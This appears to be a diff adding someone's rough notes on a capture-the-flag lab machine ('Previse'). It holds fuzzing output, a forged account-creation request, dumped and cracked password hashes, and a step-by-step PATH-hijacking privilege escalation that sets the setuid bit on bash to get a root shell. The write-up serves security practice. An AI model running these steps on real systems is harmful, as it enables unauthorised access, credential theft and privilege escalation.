@@ -1,0 +1,179 @@
+nishan …/htb on 🌱 master [?] via ⬢ v14.12.0 via 🐍 v2.7.17 
+❯ ffuf -w ~/wordlist/content.txt -t 10 -u http://10.10.11.104/FUZZ.php -mc all -fc 404
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.104/FUZZ.php
+ :: Wordlist         : FUZZ: /home/nishan/wordlist/content.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 10
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 404
+________________________________________________
+
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 281ms]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 281ms]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 281ms]
+accounts                [Status: 302, Size: 3994, Words: 1096, Lines: 94, Duration: 284ms]
+config                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 290ms]
+download                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
+files                   [Status: 302, Size: 4914, Words: 1531, Lines: 113, Duration: 291ms]
+footer                  [Status: 200, Size: 217, Words: 10, Lines: 6, Duration: 295ms]
+header                  [Status: 200, Size: 980, Words: 183, Lines: 21, Duration: 289ms]
+index                   [Status: 302, Size: 2801, Words: 737, Lines: 72, Duration: 292ms]
+login                   [Status: 200, Size: 2224, Words: 486, Lines: 54, Duration: 288ms]
+logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 290ms]
+logs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 291ms]
+nav                     [Status: 200, Size: 1248, Words: 462, Lines: 32, Duration: 288ms]
+status                  [Status: 302, Size: 2968, Words: 749, Lines: 75, Duration: 292ms]
+:: Progress: [4686/4686] :: Job [1/1] :: 34 req/sec :: Duration: [0:02:18] :: Errors: 0 ::
+
+
+POST /accounts.php HTTP/1.1
+
+Host: 10.10.11.104
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Content-Type: application/x-www-form-urlencoded
+
+Connection: close
+
+Content-Length: 50
+
+
+
+username=nishan&password=password&confirm=password
+
+
+
+
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'unsuse' at line 1
+mysql> use previse;
+use previse;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> SHOW TABLES;
+SHOW TABLES;
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+2 rows in set (0.00 sec)
+
+mysql> SELECT * FROM accounts;
+SELECT * FROM accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | ammar123 | $1$🧂llol$QECZBO9zfZVhHy7yazM1C1 | 2021-09-18 07:01:33 |
+|  3 | nishan   | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-09-18 07:37:30 |
+|  4 | admin    | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-09-18 07:50:41 |
+|  5 | test123  | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-09-18 07:50:43 |
++----+----------+------------------------------------+---------------------+
+5 rows in set (0.00 sec)
+
+
+
+➜ python crack.py ../../wordlist/10-million-password-list-top-1000000.txt ./hash.txt 
+['$1$\xf0\x9f\xa7\x82llol$DQpmdvnb7EeuO6UaqRItf.', '$1$\xf0\x9f\xa7\x82llol$QECZBO9zfZVhHy7yazM1C1', '$1$\xf0\x9f\xa7\x82llol$79cV9c1FNnnr7LcfPFlqQ0', '$1$\xf0\x9f\xa7\x82llol$79cV9c1FNnnr7LcfPFlqQ0', '$1$\xf0\x9f\xa7\x82llol$sP8qi2I.K6urjPuzdGizl1', '']
+('HASH FOUND', 'password\n', '$1$\xf0\x9f\xa7\x82llol$79cV9c1FNnnr7LcfPFlqQ0')
+('HASH FOUND', 'password\n', '$1$\xf0\x9f\xa7\x82llol$79cV9c1FNnnr7LcfPFlqQ0')
+('HASH FOUND', 'test123\n', '$1$\xf0\x9f\xa7\x82llol$sP8qi2I.K6urjPuzdGizl1')
+
+
+
+
+('HASH FOUND', 'ammar123\n', '$1$\xf0\x9f\xa7\x82llol$QECZBO9zfZVhHy7yazM1C1')
+
+
+ilovecody112235! for m4lwhere
+
+
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+cat /opt/scripts/access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+
+
+1. first for foothold , 302 redirection, found another page in burp. create user
+2. login
+3. /logs had os injection
+4. got all the files. config.php had mysqlpassword
+5. inside table m4lwhere hash, cracked it
+6. logged in and got hash
+7. sudo -l 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+
+8. Notice that the script runs the gzip command indirectly. This makes the script vulnerable to $PATH manipulation. , did
+not know about this, had to see writeup
+9. 
+create another gzip file
+
+m4lwhere@previse:~$ echo "chmod +s /bin/bash" > /tmp/gzip 
+echo "chmod +s /bin/bash" > /tmp/gzip
+
+
+m4lwhere@previse:~$ cd /tmp
+cd /tmp
+m4lwhere@previse:/tmp$ chmod +x gzip
+chmod +x gzip
+
+adding to left, cause path begins from left
+m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+
+executing file
+m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
+sudo /opt/scripts/access_backup.sh
+
+m4lwhere@previse:/tmp$ ls -al /bin/bash
+ls -al /bin/bash
+-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+
+m4lwhere@previse:/tmp$ bash -p
+bash -p
+bash-4.4# ls /root
+ls /root
+root.txt
+bash-4.4# cat /root/root.txt
+cat /root/root.txt
+4c1060bd79030eb03bcc4a31c17248cc
+bash-4.4# exit
+exit
+exit
+m4lwhere@previse:/tmp$ 
